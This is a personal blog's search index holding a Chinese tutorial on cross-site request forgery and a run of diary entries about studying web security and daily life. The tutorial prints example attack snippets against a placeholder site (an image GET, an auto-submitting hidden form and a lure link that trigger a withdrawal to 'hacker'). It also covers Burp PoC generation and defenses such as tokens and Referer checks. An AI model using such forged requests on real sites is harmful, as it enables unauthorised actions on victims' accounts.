<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSRF跨站请求伪造</title>
    <url>/2022/12/06/CSRF/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSRF似乎和XSS有些关联，但也有不同之处。</p>
<span id="more"></span>
<h1 id="CSRF-概述"><a href="#CSRF-概述" class="headerlink" title="CSRF 概述"></a>CSRF 概述</h1><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，<strong>XSS</strong> 利用的是用户对<strong>指定网站的信任</strong>，<strong>CSRF</strong> 利用的是网站对<strong>用户网页浏览器的信任</strong>。</p>
<h1 id="CSRF-攻击原理"><a href="#CSRF-攻击原理" class="headerlink" title="CSRF 攻击原理"></a>CSRF 攻击原理</h1><p><img src="/simg/CSRF_1.png" alt="CSRF攻击原理"></p>
<ol>
<li>用户输入账号信息请求登录A网站。</li>
<li>A网站验证用户信息，通过验证后返回给用户一个cookie</li>
<li>在未退出网站A之前，在同一浏览器中请求了黑客构造的恶意网站B</li>
<li>B网站收到用户请求后返回攻击性代码，构造访问A网站的语句</li>
<li>浏览器收到攻击性代码后，在用户不知情的情况下携带cookie信息请求了A网站。此时A网站不知道这是由B发起的。那么这时黑客便可尝试进行目标操作。<br>两个条件：</li>
</ol>
<ul>
<li>用户访问站点A并产生了cookie</li>
<li>用户没有退出A并且访问了站点B</li>
</ul>
<h1 id="CSRF-类型"><a href="#CSRF-类型" class="headerlink" title="CSRF 类型"></a>CSRF 类型</h1><h2 id="HTTP-GET-型"><a href="#HTTP-GET-型" class="headerlink" title="HTTP GET 型"></a>HTTP GET 型</h2><p>这类攻击非常简单，只需要一个HTTP请求：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://a.com/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>在受害者访问含有这个 img 的页面后，浏览器会自动向 <code>http://a.com</code> 发出一次HTTP请求。<code>http://a.com</code> 就会收到包含受害者登录信息的一次跨域请求。</p>
<h2 id="HTTP-POST型"><a href="#HTTP-POST型" class="headerlink" title="HTTP POST型"></a>HTTP POST型</h2><p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a.com/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;airing&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上。</p>
<h2 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h2><p>链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://a.com/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line"> 屠龙宝刀，点击就送！ </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个页面，则表示攻击成功。</p>
<h1 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h1><ol>
<li>抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞</li>
<li>如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞</li>
<li>利用工具进行CSRF检测。如：CSRFTESTER，CSRF REQUEST BUILDER等</li>
</ol>
<h2 id="使用burp快速生成CSRF-poc"><a href="#使用burp快速生成CSRF-poc" class="headerlink" title="使用burp快速生成CSRF poc"></a>使用burp快速生成CSRF poc</h2><p>当我们发现一个页面存在CSRF漏洞后，可以通过burp快速生成攻击代码<br><img src="/simg/csrf_2.png" alt=" "><br>点击复制html ，然后保存在本地<br><img src="/simg/csrf_3.png" alt=" "><br>双击打开，当受害者点击就执行了我们的CSRF代码<br><img src="/simg/csrf_4.png" alt=" "></p>
<h1 id="CSRF-防御"><a href="#CSRF-防御" class="headerlink" title="CSRF 防御"></a>CSRF 防御</h1><h2 id="检查Referer字段"><a href="#检查Referer字段" class="headerlink" title="检查Referer字段"></a>检查Referer字段</h2><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于bank.example.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于bank.example.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p>
<h2 id="添加校验token"><a href="#添加校验token" class="headerlink" title="添加校验token"></a>添加校验token</h2><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是窗体中的一个数据项。服务器将其生成并附加在窗体中，其内容是一个伪随机数。当客户端通过窗体提交请求时，这个伪随机数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
<h2 id="二次验证"><a href="#二次验证" class="headerlink" title="二次验证"></a>二次验证</h2><p>二次验证，就是在转账等关键操作之前提供当前用户的密码或验证码。可有效防御CSRF攻击。</p>
<h2 id="令牌同步模式"><a href="#令牌同步模式" class="headerlink" title="令牌同步模式"></a>令牌同步模式</h2><p>令牌同步模式（英语：Synchronizer token pattern，简称STP）。原理是：当用户发送请求时，服务器端应用将令牌（英语：token，一个保密且唯一的值）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子【英语：random seed】的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。<br>Django框架默认带有STP功能：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    &#123;% csrf_token %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>渲染后的效果如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrfmiddlewaretoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>STP能在HTML下运作顺利，但会导致服务端的复杂度升高，复杂度源于令牌的生成和验证。因为令牌是唯一且随机，如果每个表格都使用一个唯一的令牌，那么当页面过多时，服务器由于生产令牌而导致的负担也会增加。而使用会话（英语：session）等级的令牌代替的话，服务器的负担将没有那么重。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有很多内容没写，一些是因为现在用不到，一些是看不懂，等以后知识丰富了再来补充吧~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zh.wikipedia.org/zh-cn/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">跨站请求伪造</a><br><a href="https://zhuanlan.zhihu.com/p/398601816">Web漏洞之CSRF</a></p>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>锦瑟</title>
    <url>/2022/11/05/Diary_1105/</url>
    <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
<span id="more"></span>

<h1 id="随便说点"><a href="#随便说点" class="headerlink" title="随便说点"></a>随便说点</h1><p>啊，今天是我第一天写日志。摸索中…</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>今天突然回想起一首诗，是李商隐的《锦瑟》。我还蛮喜欢的。<br>      <strong>锦瑟</strong>  李商隐<br>锦瑟无端五十弦，一弦一柱思华年。<br>庄生晓梦迷蝴蝶，望帝春心托杜鹃。<br>沧海月明珠有泪，蓝田日暖玉生烟。<br>此情可待成追忆，只是当时已惘然。</p>
<p>一开始没想起来诗句，后面一想起来全托出来了。<br>上网搜的时候，看到了一个人评价这首诗–<strong>美在解与不解之中</strong><br>说得挺好的，换个词即为<strong>朦胧感</strong>。</p>
<h1 id="来说说今天做了什么吧。"><a href="#来说说今天做了什么吧。" class="headerlink" title="来说说今天做了什么吧。"></a>来说说今天做了什么吧。</h1><ol>
<li><p>上午python爬虫的网课，但课程是两年前的。因此导致很多地方对不上，即便照着参考代码写也会报错…虽然是因为我买了课没有及时学，但问群里的主讲老师也不会，这样的服务态度着实让我不适。网易云课堂上的大熊课堂python，讲得还是挺清晰，但布置的作业和视频上的代码都无法正常运行那也很糟糕。<br>给我的教训是：<em>买了有时效性的网课要及时学</em></p>
</li>
<li><p>下午睡了俩小时，午睡时间太长了。但半小时又会很快感觉困，高中的时候也没这样啊。看来还是压力不够，决定明天睡眠时间缩短到1h以内，如果感觉困，就用冷水浇醒自己。<br>先看看这样是否行得通吧。</p>
</li>
<li><p>之后看了Web安全的基础–SQL注入漏洞。今天主要是看书《Web安全深度剖析》，SQL注入这一章是看完了，看得比较快，倒懂不懂的感觉吧。主要是过一遍，明天看视频。</p>
</li>
<li><p>最后学了半小时JS。还是在网易云课堂上学的，看的leo老师的网课。讲得蛮清晰，目前感觉良好。</p>
</li>
<li><p>24:30的《孤独摇滚》动画更新了，看动画去了。</p>
</li>
</ol>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>也无风雨也无晴</title>
    <url>/2022/11/07/Diary_1107/</url>
    <content><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p>
<span id="more"></span>

<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p>
<h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p>
<p>上午早上八点的课，让人十分难以起床，毕竟晚上只睡了6h不到，起来后又不想用冷水洗脸，因为感冒。起得晚果不其然上课迟到了，虽然我不在意。</p>
<p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p>
<p>下午一直在上课，午觉也只睡了半小时。第一节是《网络安全服务与管理》，去了之后发现这门课都没什么用。干脆下次不去了吧。</p>
<p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>惜</title>
    <url>/2022/11/06/Diary_1106/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
<li>上午9点体测，跳远和引体向上。排队等了一个小时。</li>
<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>夫天地者，万物之逆旅也</title>
    <url>/2022/11/08/Diary_1108/</url>
    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
<span id="more"></span>

<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>欲望占据的一周</title>
    <url>/2022/11/13/Diary_1113/</url>
    <content><![CDATA[<p><img src="/images/%E6%89%98%E5%B0%948.gif" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>好几天没写日记了，这一周实在是非常懈怠，虽然写这篇的时候已经很迟了，明早8点还得起床，但我还是要写，记录一下我的罪行！</p>
<h1 id="对自己感到愤怒"><a href="#对自己感到愤怒" class="headerlink" title="对自己感到愤怒"></a>对自己感到愤怒</h1><p>从周四开始，被周围某人诱惑买了文明6，于是开始玩，这一下子变得无法收拾，当天玩到4点过。随后的几天也是花费大量时间在上面。导致学习进度几乎停滞。<br>但这并不是责怪诱惑我的玩游戏的人，只不过是我自己要靠近诱惑，最终被诱惑罢了。<br>绝大多数人的意志力其实并不强，在知道王阳明不被欲望打动的方法就是远离欲望后，我也顿悟了。但这周还是破功了，真是功亏一篑啊。</p>
<p>话虽如此，其实文明6还是挺好玩的，虽然steam好评不到90%，但我蛮喜欢的。<br>周围有4人都买了这款游戏，但还是只有和专注玩游戏的人一起玩才好玩。有的人玩着玩着退了，有的人刚买就玩别的游戏，有的人忙着打电话。我和这些人玩得不到好的游戏体验，也让我挺不满的。不曾想，怂恿我买游戏的人，却没给我好的游戏体验。所以说，这样子真不可靠。不要在同一个地方跌倒两次，不要轻易被怂恿！<br>幸好周围有个人是专注玩游戏的，今天玩得很开心。倒也算是一桩幸事了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>要专注学习了！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>多情应笑我</title>
    <url>/2022/11/14/Diary_1114/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%9B&%E6%8A%9A%E5%AD%905.png" alt="凛和抚子"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>满足？懈怠？享受？堕落？</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>故国神游，多情应笑我，早生华发。</p>
<h1 id="完整而有力"><a href="#完整而有力" class="headerlink" title="完整而有力"></a>完整而有力</h1><p>今日的生活勉强算是充实，不过还没从上周的状态中恢复过来。也许正因如此，我才能如此果断地选择花费2小时看搖曳露营的电影。所谓塞翁失马焉知非福吧。<br>python的复习又给了我一种好像什么都复习完了，不需要再看了的感觉，但我知道这是不行的，病毒和计算机网络的教训历历在目，我一定要克服这种半壶水响叮当的傲慢。<br>虽然我并不反感傲慢，但我认为真正的傲慢，是凌驾于一切之上，睥睨众生的狂气。而不是自大自以为足够了的浮躁情绪。<br>摇曳露营电影看完了，虽然一路上带着小心翼翼的感觉，什么有什么波动大的情节，但幸好，没有网友说的那样糟糕。<br>我的文笔水平十分落后啊，本想写些什么，却发现只得冒出点浑浊的自来水，完全没有让人想喝下去的动力嘛。还是参考一下信评动画吧。酝酿一下，想的和写的是两回事啊！<br>正如标题所写，我想过一种完整而有力的人生。所谓完整，即不要被碎片化的事物分散精力与时间，比如看一些无关紧要的视频，或是做一些毫无意义的事情，又或是毫无理由的拖延等等。所谓有力，如尼采的一句话所说：每一个不曾起舞的日子，都是对生命的辜负。每一天都要竭尽全力去度过，去参与，去燃烧自己的热情。不要害怕过度，即便过度了，这样的日子也是一天天在减少，珍惜吧！</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>尽快恢复学习的状态，不要一蹶不振，不要持续受到诱惑，还有很多事需要完成啊！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>聪明与智慧</title>
    <url>/2022/11/16/Diary_1116/</url>
    <content><![CDATA[<p><img src="/images/%E6%89%98%E5%B0%9416.png" alt="托尔"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>12332112333321</p>
<h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>大知闲闲，小知间间；大言炎炎，小言詹詹</p>
<h1 id="指尖须臾"><a href="#指尖须臾" class="headerlink" title="指尖须臾"></a>指尖须臾</h1><p>python期末考试结束了，很简单。不仅是我这么觉得，考室里一半以上的人都30分钟交卷了，或许这是今年最简单的一次考试？</p>
<p>之前本想说点什么，到临睡前却不知说什么了。可如果当时有想法的时候就写，又会打断正在做的事。两难选择，一直如此。</p>
<p>聪明是先天的，智慧是后天的。聪明通常是运用于某些专门知识上的，智慧通常更加广泛，因而并不一定能给学习运用专门知识带来较大帮助。聪明与智慧并不是一个同义词，至少我这么想。有其中一种，并不代表能拥有另一种。<br>有趣的是，如果只能拥有其中一种，那么人会更倾向于哪一种呢？<br>就思考到这里吧，夜已弥漫。</p>
<p>今天帮朋友弄“今日校园”app的定位签到，花了我大半时间，也没弄出来。这玩意儿太难搞了。得亏我这边没弄呢。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>别忘了CET6的复习！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>花落知多少</title>
    <url>/2022/11/17/Diary_1117/</url>
    <content><![CDATA[<p><img src="/images/8.jpg" alt=" "></p>
<span id="more"></span>

<h1 id="一句诗"><a href="#一句诗" class="headerlink" title="一句诗"></a>一句诗</h1><p>The world has kissed my soul with its pain, asking for its return in songs.<br>世界以痛吻我，要我报之以歌。</p>
<h1 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h1><p>交易要以最少的信息，达成最大的目的。<br>不要觉得自己宽容大度，多出让一些没关系，好心有时会办坏事。<br>今日与人交易得到的教训。虽然没赚到钱，但让我学到了比钱更重要的东西。</p>
<h1 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h1><p>今天晚上看的动画《赛博朋克 边缘行者》，里面出现了黑客。<br>让我自己想成为黑客的心又微微颤动了，差点想大半夜的再学一会儿哈哈<br>回想起第一部看的动画里，出现黑客的，那还非《命运石之门》莫属。</p>
<h1 id="效率"><a href="#效率" class="headerlink" title="效率"></a>效率</h1><p>学到22点的时候感觉蛮疲惫了，洗冷水脸也没什么效果，导致本来一小时内能完成的，花了两小时。<br>是不是运动一下比较好呢，下次试试吧。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>普通且自信</title>
    <url>/2022/11/18/Diary_1118/</url>
    <content><![CDATA[<p><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B51.png" alt="犬山葵"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一天的学习还是挺充实的，平静的生活。</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>长风破浪会有时，直挂云帆济沧海。</p>
<h1 id="行路难"><a href="#行路难" class="headerlink" title="行路难"></a>行路难</h1><p>这样的日子，独自的世界。<br>是枯燥的吗？是斑斓的吗？让人多想的时候，就不禁觉得，热情会被拉扯而消散。<br>还是少想一些吧，多做事。<br>今天突然想到了一个短语，大概是最近几年流行的？ 普通且自信<br>其实原本都没怎么在意过这个词，是被某人用在我身上贬我的时候，才注意到的。<br>似乎在网络上被人作为贬义而广泛使用。但其实，我个人而言，还蛮喜欢这个短语的。<br>说起来，什么是普通呢？<br>我想，当某人拥有某一方面的长处时，或许有人会认为他不普通。但这其实只是就这方面而言，其他不是长处的方面，不也很普通吗？<br>如果说，崭露头角的人是不普通的，那么衡量标准就成为了一个人在这世界上的名气，那岂不是“不普通”&#x3D;“名气大”吗？我也并不这么认为。<br>浅浅的思考了之后，给出一个暂时的答案吧。<br>我心中的不普通的人，一种是有智慧wisdom的人，另一种是在某一方面处于超脱常人（在整个世界上来衡量）的人。这后一种的不普通，就不一定是好的形容了。<br>自信，我认为在认为时候都不应当是贬义词，与自信相对的贬义词并不是没有：过度自信是自负，没有自信是自卑。</p>
<p>普通且自信，这个标签，也许还不错？<br>即便有人用这个词来贬我，我恐怕也只会报之一笑吧。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>每次碍于时间，想写什么，都不敢写深入，抽个时间，写点深刻的文字吧。</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>平水远矣</title>
    <url>/2022/11/19/Diary_1119/</url>
    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_4.png" alt="凉宫春日&amp;长门有希"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>糟糕的一天</p>
<h1 id="兜兜转转"><a href="#兜兜转转" class="headerlink" title="兜兜转转"></a>兜兜转转</h1><p>今天一天什么都没玩，但我感觉非常地不好，没学到多少东西。就像绕着一个圈子一直在兜兜转转，没啥好说的，明早早起。<br>今天是World Cup(世界杯)开幕式来着，我倒是没什么兴趣，就这样吧。</p>
<h1 id="平水远矣"><a href="#平水远矣" class="headerlink" title="平水远矣"></a>平水远矣</h1><p>人生就像一碗盛满的水，唯有把水端平，才走得远。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>赶紧早点睡咯</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>我对普通人类没有兴趣</title>
    <url>/2022/11/21/Diary_1121/</url>
    <content><![CDATA[<p><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B4.png" alt="志摩凛"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>晚上学习的时候一个东西始终搞不通，烦死人了。</p>
<h1 id="一段文言文"><a href="#一段文言文" class="headerlink" title="一段文言文"></a>一段文言文</h1><p>夫子之道至大，故天下莫能容。虽然，夫子推而行之，不容何病，不容然后见君子！夫道之不修也，是吾丑也。夫道既已大修而不用，是有国者之丑也。不容何病，不容然后见君子！<br>--节选自《史记 孔子世家》</p>
<h1 id="不容然后见君子"><a href="#不容然后见君子" class="headerlink" title="不容然后见君子"></a>不容然后见君子</h1><p>上面那段文言文，最喜欢的就是我写在标题上这句话。有一种豪气或是傲慢在里面：你天下容不下我的理念，这是你天下的度量不够大，这不是我的过错。容不下又如何呢？就是因为容不下，才显得我是君子！<br>这是孔子提问时，颜回对孔子的回答。不愧是孔子最得意的门生呀。我想，做人能做到这种程度，就已然足够了。</p>
<h1 id="永恒"><a href="#永恒" class="headerlink" title="永恒"></a>永恒</h1><p>在最光辉灿烂的时候把生命一下子玩到尽头，就是永恒！  --黄家驹<br>来吧，用尽力气，去燃烧生命吧！</p>
]]></content>
      <categories>
        <category>日志</category>
      </categories>
      <tags>
        <tag>日志</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>出淤泥</title>
    <url>/2022/11/23/Diary_1123/</url>
    <content><![CDATA[<p><img src="/images/kaneki_3.png" alt="金木研"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>World Cup(世界杯)很火，以前都没怎么关注，但是在大学因为各方面因素吧，让我这种从不关注世界杯的人都开始了。当然是被迫的，实在太吵了周围人，让我不得不。<br>然而，虽然很火，其实重头还是在赌球上，并不在足球本身，想想也挺无聊。</p>
<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>既见君子，云胡不喜</p>
<h1 id="欲望的故事"><a href="#欲望的故事" class="headerlink" title="欲望的故事"></a>欲望的故事</h1><p>王阳明上学的路上要经过一条街，一天，街上忽然多了一家赌博的小馆子，里面每天都挤满了人。跟王阳明一起上学的同伴们有时也会好奇地站在门口往里面看。王守仁提醒大家离赌场远点，大家都不当回事：就看看，不进去，有啥？<br>看看劝阻无效，王阳明就跟小伙伴儿建议：咱们换条路走吧。小伙伴儿很不解：“他赌他的，咱走咱的，互不相干，有啥关系？你这胆子也太小了。”<br>王阳明答：“我怕看多了，也会产生欲望，挡不住诱惑。”<br>小伙伴们哈哈大笑：“看几眼就受不了，那意志也太不坚定了。咱们这么志怀高远的不会的，放心好了。”<br>小伙伴们坚持走原路，只有王阳明一个人每天绕道去私塾，不再从那条街过。<br>一个多月后，有位同学接连几天都没来上课。原来他前段时间迷上了赌博，开始只是拿一点小钱来玩，后来越玩越大，偷了家里的玉器，父母得知后非常生气，把他关在家中反省。<br>王守仁后来讲这个故事给人听，并总结说：“想要避免欲望，最好的办法就是远离，甚至不要多看一眼。这不是胆子小，而是从根源上隔绝欲望。”</p>
